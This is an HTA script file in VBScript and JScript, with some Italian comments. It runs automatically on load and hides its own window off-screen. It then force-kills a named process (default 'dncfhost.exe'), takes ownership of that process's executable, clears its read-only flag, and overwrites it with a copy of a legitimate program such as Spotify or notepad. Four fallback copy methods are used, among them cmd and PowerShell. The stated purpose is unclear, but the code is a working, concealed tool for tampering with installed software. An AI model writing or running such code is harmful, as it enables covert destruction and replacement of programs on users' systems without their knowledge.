<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION
    ID="SD"
    APPLICATIONNAME="SD"
    BORDER="none"
    BORDERSTYLE="none"
    CAPTION="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
/>
<title></title>
<style>
body { margin: 0; padding: 0; background: transparent; }
</style>
</head>
<body>
<script type="text/vbscript">
Function GetProcessByName(pn)
    On Error Resume Next
    Dim o, c, p, f
    f = False
    Set o = GetObject("winmgmts:\\.\root\cimv2")
    Set c = o.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & pn & "'")
    For Each p in c
        f = True
        Exit For
    Next
    GetProcessByName = f
End Function

Function GetProcessPath(pn)
    On Error Resume Next
    Dim o, c, p
    Set o = GetObject("winmgmts:\\.\root\cimv2")
    Set c = o.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name = '" & pn & "'")
    For Each p in c
        If Not IsNull(p.ExecutablePath) Then
            GetProcessPath = p.ExecutablePath
            Exit Function
        End If
    Next
    GetProcessPath = ""
End Function

Function ForceKillProcess(pn)
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.Run "taskkill /F /IM " & pn, 0, True
End Function

Function RemoveReadOnly(path)
    On Error Resume Next
    Dim fso, f
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(path) Then
        Set f = fso.GetFile(path)
        f.Attributes = 0
        RemoveReadOnly = True
    Else
        RemoveReadOnly = False
    End If
End Function

Function TakeOwnership(path)
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.Run "takeown /F """ & path & """", 0, True
End Function

Function BinaryCopyMethod1(sf, tf)
    On Error Resume Next
    Dim a, b
    Set a = CreateObject("ADODB.Stream")
    a.Type = 1
    a.Open
    a.LoadFromFile sf
    b = a.Read
    a.Close
    
    a.Open
    a.Type = 1
    a.Write b
    a.SaveToFile tf, 2
    a.Close
    
    If Err.Number = 0 Then
        BinaryCopyMethod1 = True
    Else
        BinaryCopyMethod1 = False
    End If
End Function

Function BinaryCopyMethod2(sf, tf)
    On Error Resume Next
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    fso.CopyFile sf, tf, True
    
    If Err.Number = 0 Then
        BinaryCopyMethod2 = True
    Else
        BinaryCopyMethod2 = False
    End If
End Function

Function BinaryCopyMethod3(sf, tf)
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.Run "cmd /c copy /Y """ & sf & """ """ & tf & """", 0, True
    
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(tf) Then
        BinaryCopyMethod3 = True
    Else
        BinaryCopyMethod3 = False
    End If
End Function

Function BinaryCopyMethod4(sf, tf)
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -Command ""Copy-Item -Path '" & sf & "' -Destination '" & tf & "' -Force""", 0, True
    
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(tf) Then
        BinaryCopyMethod4 = True
    Else
        BinaryCopyMethod4 = False
    End If
End Function

Function AdvancedBinaryCopy(sf, tf)
    On Error Resume Next
    Dim success
    
    success = BinaryCopyMethod1(sf, tf)
    If success Then
        AdvancedBinaryCopy = "Method1-ADODB"
        Exit Function
    End If
    
    success = BinaryCopyMethod2(sf, tf)
    If success Then
        AdvancedBinaryCopy = "Method2-FSO"
        Exit Function
    End If
    
    success = BinaryCopyMethod3(sf, tf)
    If success Then
        AdvancedBinaryCopy = "Method3-CMD"
        Exit Function
    End If
    
    success = BinaryCopyMethod4(sf, tf)
    If success Then
        AdvancedBinaryCopy = "Method4-PowerShell"
        Exit Function
    End If
    
    AdvancedBinaryCopy = "FAILED"
End Function

Function FindRecursive(folder, fn)
    On Error Resume Next
    Dim fso, f, sf, result
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FolderExists(folder) Then
        FindRecursive = ""
        Exit Function
    End If
    
    Set f = fso.GetFolder(folder)
    
    If fso.FileExists(fso.BuildPath(folder, fn)) Then
        FindRecursive = fso.BuildPath(folder, fn)
        Exit Function
    End If
    
    Dim depth
    depth = Len(folder) - Len(Replace(folder, "\", ""))
    
    If depth < 5 Then
        For Each sf in f.SubFolders
            result = FindRecursive(sf.Path, fn)
            If result <> "" Then
                FindRecursive = result
                Exit Function
            End If
        Next
    End If
    
    FindRecursive = ""
End Function
</script>
<script type="text/javascript">
window.resizeTo(1,1);
window.moveTo(-2000,-2000);

var logMessages = [];
var targetFilePath = "";

function log(msg) {
    var timestamp = new Date().toISOString();
    var logMsg = "[" + timestamp + "] " + msg;
    logMessages.push(logMsg);
}

function sleep(ms) {
    return new Promise(function(resolve) {
        window.setTimeout(resolve, ms);
    });
}

async function saveLogs() {
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var sh = new ActiveXObject("WScript.Shell");
        
        var tempPath = sh.ExpandEnvironmentStrings("%TEMP%");
        var logPath = fso.BuildPath(tempPath, "replace_log_" + Date.now() + ".txt");
        
        var ts = fso.CreateTextFile(logPath, true);
        ts.WriteLine("=== REPLACE OPERATION LOG ===");
        ts.WriteLine("Time: " + new Date().toString());
        ts.WriteLine("Target file: " + targetFilePath);
        ts.WriteLine("");
        
        for (var i = 0; i < logMessages.length; i++) {
            ts.WriteLine(logMessages[i]);
        }
        
        ts.Close();
        log("Logs saved to: " + logPath);
        
        // Mostra anche un alert con il path
        alert("Log saved to:\n" + logPath);
        return true;
    } catch(e) {
        log("Error saving to TEMP: " + e.message);
        try {
            var sh2 = new ActiveXObject("WScript.Shell");
            var fso2 = new ActiveXObject("Scripting.FileSystemObject");
            var desktopPath = sh2.SpecialFolders("Desktop");
            var logPath2 = fso2.BuildPath(desktopPath, "replace_log_" + Date.now() + ".txt");
            
            var ts2 = fso2.CreateTextFile(logPath2, true);
            ts2.WriteLine("=== REPLACE OPERATION LOG ===");
            ts2.WriteLine("Time: " + new Date().toString());
            ts2.WriteLine("Target file: " + targetFilePath);
            ts2.WriteLine("");
            
            for (var i = 0; i < logMessages.length; i++) {
                ts2.WriteLine(logMessages[i]);
            }
            
            ts2.Close();
            log("Logs saved to Desktop: " + logPath2);
            alert("Log saved to Desktop:\n" + logPath2);
            return true;
        } catch(e2) {
            log("Error saving to Desktop: " + e2.message);
            alert("FAILED to save log!\nError: " + e2.message);
            return false;
        }
    }
}

function p() {
    try {
        var w = new ActiveXObject("WScript.Shell");
        var e = w.Environment("Process");
        var c = e("CMDLINE");
        var m = c.match(/--name\s+(\S+)/i);
        if (m) {
            log("Target from cmdline: " + m[1]);
            return m[1];
        }
    } catch(x) {}
    log("Default target: dncfhost.exe");
    return "dncfhost.exe";
}

function findLegitExe() {
    log("Searching for legitimate executable...");
    
    var sh = new ActiveXObject("WScript.Shell");
    
    var targets = [
        {name: "Spotify.exe", hint: "Spotify"},
        {name: "Discord.exe", hint: "Discord"},
        {name: "Teams.exe", hint: "Microsoft Teams"},
        {name: "Slack.exe", hint: "Slack"},
        {name: "Skype.exe", hint: "Skype"},
        {name: "chrome.exe", hint: "Google Chrome"},
        {name: "msedge.exe", hint: "Microsoft Edge"},
        {name: "firefox.exe", hint: "Mozilla Firefox"},
        {name: "brave.exe", hint: "Brave Browser"},
        {name: "opera.exe", hint: "Opera Browser"},
        {name: "Code.exe", hint: "Visual Studio Code"},
        {name: "Telegram.exe", hint: "Telegram"},
        {name: "WhatsApp.exe", hint: "WhatsApp"},
        {name: "Zoom.exe", hint: "Zoom"},
        {name: "Steam.exe", hint: "Steam"},
        {name: "EpicGamesLauncher.exe", hint: "Epic Games"},
        {name: "Origin.exe", hint: "Origin"},
        {name: "Battle.net.exe", hint: "Battle.net"},
        {name: "vlc.exe", hint: "VLC Media Player"},
        {name: "winamp.exe", hint: "Winamp"},
        {name: "7zFM.exe", hint: "7-Zip"},
        {name: "WinRAR.exe", hint: "WinRAR"},
        {name: "notepad.exe", hint: "Notepad"},
        {name: "calc.exe", hint: "Calculator"},
        {name: "mspaint.exe", hint: "Paint"}
    ];
    
    var paths = [
        sh.ExpandEnvironmentStrings("%APPDATA%"),
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%"),
        sh.ExpandEnvironmentStrings("%PROGRAMFILES%"),
        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%"),
        "C:\\Windows\\System32"
    ];
    
    for (var i = 0; i < targets.length; i++) {
        var target = targets[i];
        log("Looking for " + target.hint + "...");
        
        for (var j = 0; j < paths.length; j++) {
            try {
                var result = FindRecursive(paths[j], target.name);
                if (result && result !== "") {
                    log("FOUND: " + result);
                    return result;
                }
            } catch(e) {}
        }
    }
    
    var fallback = "C:\\Windows\\System32\\notepad.exe";
    log("Fallback: " + fallback);
    return fallback;
}

async function waitForTermination(pn, maxWait) {
    log("Waiting for " + pn + " to terminate (max " + maxWait + "s)...");
    
    for (var i = 0; i < maxWait; i++) {
        var running = GetProcessByName(pn);
        if (!running) {
            log("Process terminated after " + (i + 1) + "s");
            return true;
        }
        await sleep(1000);
    }
    
    log("Timeout after " + maxWait + "s, process still running");
    return false;
}

async function ex() {
    log("=== REPLACE OPERATION START ===");
    
    var pn = p();
    log("Target process: " + pn);
    
    var tf = GetProcessPath(pn);
    targetFilePath = tf;
    log("Target path: " + (tf || "NOT FOUND"));
    
    if (!tf || tf === "") {
        log("ERROR: No target path, aborting");
        await saveLogs();
        window.close();
        return;
    }
    
    var sf = findLegitExe();
    log("Source: " + sf);
    
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    if (!fso.FileExists(sf)) {
        log("ERROR: Source not found");
        await saveLogs();
        window.close();
        return;
    }
    
    if (!fso.FileExists(tf)) {
        log("ERROR: Target not found");
        await saveLogs();
        window.close();
        return;
    }
    
    var sfSize = fso.GetFile(sf).Size;
    var tfSizeOrig = fso.GetFile(tf).Size;
    log("Source size: " + sfSize + " bytes");
    log("Target size: " + tfSizeOrig + " bytes");
    
    // STEP 1: Force kill process
    log("STEP 1: Killing process...");
    ForceKillProcess(pn);
    await sleep(1000);
    
    var terminated = !GetProcessByName(pn);
    if (!terminated) {
        log("First kill failed, trying again...");
        ForceKillProcess(pn);
        await sleep(1000);
        terminated = !GetProcessByName(pn);
    }
    
    if (!terminated) {
        log("WARNING: Process still running, continuing anyway...");
        await waitForTermination(pn, 10);
    } else {
        log("Process killed successfully");
    }
    
    await sleep(500);
    
    // STEP 2: Take ownership e rimuovi protezioni
    log("STEP 2: Taking ownership and removing protections...");
    TakeOwnership(tf);
    await sleep(500);
    RemoveReadOnly(tf);
    await sleep(500);
    
    // STEP 3: REPLACE con 4 metodi diversi
    log("STEP 3: Executing replace with multiple methods...");
    var method = AdvancedBinaryCopy(sf, tf);
    log("Replace result: " + method);
    
    await sleep(500);
    
    // STEP 4: Verifica
    log("STEP 4: Verification...");
    try {
        if (fso.FileExists(tf)) {
            var tfSizeNew = fso.GetFile(tf).Size;
            log("Target exists, new size: " + tfSizeNew + " bytes");
            
            if (tfSizeNew == sfSize) {
                log("✓✓✓ REPLACE SUCCESS! Size matches perfectly!");
            } else if (tfSizeNew > 0) {
                log("✓ REPLACE COMPLETED! Size differs (expected: " + sfSize + ", got: " + tfSizeNew + ")");
            } else {
                log("✗ WARNING: File exists but size is 0");
            }
        } else {
            log("✗ ERROR: Target file disappeared after replace");
        }
    } catch(e) {
        log("Verification error: " + e.message);
    }
    
    log("=== REPLACE OPERATION END ===");
    await saveLogs();
    
    await sleep(2000);
    window.close();
}

window.onload = function() {
    log("HTA loaded, starting in 500ms...");
    window.setTimeout(function() { 
        ex().catch(function(e) {
            log("FATAL: " + e.message);
            saveLogs().then(function() {
                window.close();
            });
        });
    }, 500);
};
</script>
</body>
</html>
